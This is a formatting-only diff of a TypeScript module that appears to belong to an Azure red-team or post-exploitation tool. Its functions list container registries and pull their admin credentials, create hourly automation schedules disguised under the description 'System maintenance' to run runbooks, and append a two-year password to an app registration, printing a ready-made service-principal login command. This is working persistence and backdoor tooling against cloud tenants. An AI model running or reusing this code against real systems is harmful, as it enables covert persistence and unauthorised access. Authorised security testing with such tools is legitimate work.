@@ -819,8 +819,18 @@ export async function acrImageBackdoor(args: string[], timeout: number): Promise
   const output: string[] = ["[*] Azure Container Registry image backdoor...\n"]
 
   if (method === "list") {
-    const registries = await az(["acr", "list", "--query", "[].{name:name,rg:resourceGroup,login:loginServer,admin:adminUserEnabled,sku:sku.name}"], sub, timeout)
-    if (registries.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${registries.stderr.slice(0, 200)}`, findings }
+    const registries = await az(
+      [
+        "acr",
+        "list",
+        "--query",
+        "[].{name:name,rg:resourceGroup,login:loginServer,admin:adminUserEnabled,sku:sku.name}",
+      ],
+      sub,
+      timeout,
+    )
+    if (registries.exitCode !== 0)
+      return { output: output.join("\n") + `[-] Failed: ${registries.stderr.slice(0, 200)}`, findings }
     const regList = tryJson(registries.stdout) || []
     output.push(`[+] Container registries: ${regList.length}`)
     for (const r of regList) {
@@ -872,7 +882,8 @@ export async function acrImageBackdoor(args: string[], timeout: number): Promise
         })
       }
     }
-    if (creds.exitCode !== 0) output.push(`[-] Cannot get credentials (admin user may be disabled): ${creds.stderr.slice(0, 200)}`)
+    if (creds.exitCode !== 0)
+      output.push(`[-] Cannot get credentials (admin user may be disabled): ${creds.stderr.slice(0, 200)}`)
   }
 
   if (method === "inject" && image) {
@@ -910,20 +921,41 @@ export async function scheduledTaskPersist(args: string[], timeout: number): Pro
 
   if (method === "list") {
     const accts = await az(["automation", "account", "list"], sub, timeout)
-    if (accts.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${accts.stderr.slice(0, 200)}`, findings }
+    if (accts.exitCode !== 0)
+      return { output: output.join("\n") + `[-] Failed: ${accts.stderr.slice(0, 200)}`, findings }
     const acctList = tryJson(accts.stdout) || []
     output.push(`[+] Automation accounts: ${acctList.length}`)
     for (const a of acctList) {
       output.push(`    ${a.name} (${a.resourceGroup}) — state: ${a.state}`)
-      const schedules = await az(["automation", "schedule", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup], sub, timeout)
+      const schedules = await az(
+        ["automation", "schedule", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup],
+        sub,
+        timeout,
+      )
       if (schedules.exitCode === 0) {
         const schedList = tryJson(schedules.stdout) || []
         output.push(`      Schedules: ${schedList.length}`)
         for (const s of schedList) {
-          output.push(`        ${s.name} — freq: ${s.frequency}, interval: ${s.interval}, enabled: ${s.isEnabled !== false}, next: ${s.nextRun || "unknown"}`)
+          output.push(
+            `        ${s.name} — freq: ${s.frequency}, interval: ${s.interval}, enabled: ${s.isEnabled !== false}, next: ${s.nextRun || "unknown"}`,
+          )
         }
       }
-      const jobs = await az(["automation", "job", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup, "--query", "[?status=='Completed' || status=='Running'].{runbook:runbook.name,status:status,start:startTime}"], sub, timeout)
+      const jobs = await az(
+        [
+          "automation",
+          "job",
+          "list",
+          "--automation-account-name",
+          a.name,
+          "--resource-group",
+          a.resourceGroup,
+          "--query",
+          "[?status=='Completed' || status=='Running'].{runbook:runbook.name,status:status,start:startTime}",
+        ],
+        sub,
+        timeout,
+      )
       if (jobs.exitCode === 0) {
         const jobList = tryJson(jobs.stdout) || []
         if (jobList.length > 0) output.push(`      Recent jobs: ${jobList.length}`)
@@ -932,14 +964,31 @@ export async function scheduledTaskPersist(args: string[], timeout: number): Pro
     return { output: output.join("\n"), findings }
   }
 
-  if (!automationAccount || !rg || !runbookName) return { output: "[-] --automation-account, --resource-group, --runbook-name required", findings }
+  if (!automationAccount || !rg || !runbookName)
+    return { output: "[-] --automation-account, --resource-group, --runbook-name required", findings }
 
   const name = scheduleName || `cs-sched-${Date.now().toString(36)}`
   output.push(`[*] Creating schedule: ${name}`)
   output.push(`    Frequency: hourly, interval: ${interval}`)
 
   const create = await az(
-    ["automation", "schedule", "create", "--automation-account-name", automationAccount, "--resource-group", rg, "--name", name, "--frequency", "Hour", "--interval", interval, "--description", "System maintenance"],
+    [
+      "automation",
+      "schedule",
+      "create",
+      "--automation-account-name",
+      automationAccount,
+      "--resource-group",
+      rg,
+      "--name",
+      name,
+      "--frequency",
+      "Hour",
+      "--interval",
+      interval,
+      "--description",
+      "System maintenance",
+    ],
     sub,
     timeout,
   )
@@ -947,7 +996,19 @@ export async function scheduledTaskPersist(args: string[], timeout: number): Pro
   if (create.exitCode === 0) {
     output.push(`[+] Schedule created: ${name}`)
     const link = await az(
-      ["automation", "job-schedule", "create", "--automation-account-name", automationAccount, "--resource-group", rg, "--runbook-name", runbookName, "--schedule-name", name],
+      [
+        "automation",
+        "job-schedule",
+        "create",
+        "--automation-account-name",
+        automationAccount,
+        "--resource-group",
+        rg,
+        "--runbook-name",
+        runbookName,
+        "--schedule-name",
+        name,
+      ],
       sub,
       timeout,
     )
@@ -978,13 +1039,26 @@ export async function oauthAppPersist(args: string[], timeout: number): Promise<
   const output: string[] = ["[*] OAuth app consent persistence...\n"]
 
   if (method === "list") {
-    const apps = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/applications?$select=displayName,appId,passwordCredentials,keyCredentials,requiredResourceAccess&$top=50", "-o", "json"], timeout)
+    const apps = await run(
+      "az",
+      [
+        "rest",
+        "--method",
+        "GET",
+        "--url",
+        "https://graph.microsoft.com/v1.0/applications?$select=displayName,appId,passwordCredentials,keyCredentials,requiredResourceAccess&$top=50",
+        "-o",
+        "json",
+      ],
+      timeout,
+    )
     if (apps.exitCode === 0) {
       const appList = tryJson(apps.stdout)?.value || []
       output.push(`[+] App registrations: ${appList.length}`)
       for (const a of appList) {
         const creds = (a.passwordCredentials?.length || 0) + (a.keyCredentials?.length || 0)
-        const perms = a.requiredResourceAccess?.flatMap((r: Record<string, unknown[]>) => r.resourceAccess || []).length || 0
+        const perms =
+          a.requiredResourceAccess?.flatMap((r: Record<string, unknown[]>) => r.resourceAccess || []).length || 0
         output.push(`    ${a.displayName} (${a.appId}) — credentials: ${creds}, permissions: ${perms}`)
         if (perms > 10) {
           findings.push({
@@ -1002,7 +1076,19 @@ export async function oauthAppPersist(args: string[], timeout: number): Promise<
     }
     if (apps.exitCode !== 0) output.push(`[-] Cannot list apps: ${apps.stderr.slice(0, 200)}`)
 
-    const grants = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?$top=50", "-o", "json"], timeout)
+    const grants = await run(
+      "az",
+      [
+        "rest",
+        "--method",
+        "GET",
+        "--url",
+        "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?$top=50",
+        "-o",
+        "json",
+      ],
+      timeout,
+    )
     if (grants.exitCode === 0) {
       const grantList = tryJson(grants.stdout)?.value || []
       const adminConsent = grantList.filter((g: Record<string, string>) => g.consentType === "AllPrincipals")
@@ -1025,13 +1111,21 @@ export async function oauthAppPersist(args: string[], timeout: number): Promise<
   }
 
   if (method === "add_cred" && appName) {
-    const appSearch = await az(["ad", "app", "list", "--display-name", appName, "--query", "[0].{appId:appId,id:id,displayName:displayName}"], undefined, timeout)
+    const appSearch = await az(
+      ["ad", "app", "list", "--display-name", appName, "--query", "[0].{appId:appId,id:id,displayName:displayName}"],
+      undefined,
+      timeout,
+    )
     if (appSearch.exitCode !== 0) return { output: "[-] Cannot find app", findings }
     const app = tryJson(appSearch.stdout)
     if (!app?.appId) return { output: `[-] App not found: ${appName}`, findings }
 
     output.push(`[*] Adding credential to app: ${app.displayName} (${app.appId})`)
-    const addCred = await az(["ad", "app", "credential", "reset", "--id", app.appId, "--append", "--years", "2"], undefined, timeout)
+    const addCred = await az(
+      ["ad", "app", "credential", "reset", "--id", app.appId, "--append", "--years", "2"],
+      undefined,
+      timeout,
+    )
     if (addCred.exitCode === 0) {
       const cred = tryJson(addCred.stdout)
       if (cred) {
@@ -1040,7 +1134,9 @@ export async function oauthAppPersist(args: string[], timeout: number): Promise<
         output.push(`    App ID: ${cred.appId}`)
         output.push(`    Password: ${cred.password}`)
         output.push(`    Expires: 2 years`)
-        output.push(`\n    Login: az login --service-principal -u ${cred.appId} -p '${cred.password}' --tenant ${cred.tenant}`)
+        output.push(
+          `\n    Login: az login --service-principal -u ${cred.appId} -p '${cred.password}' --tenant ${cred.tenant}`,
+        )
         findings.push({
           checkId: "AZ-OAUTH-003",
           provider: "azure",
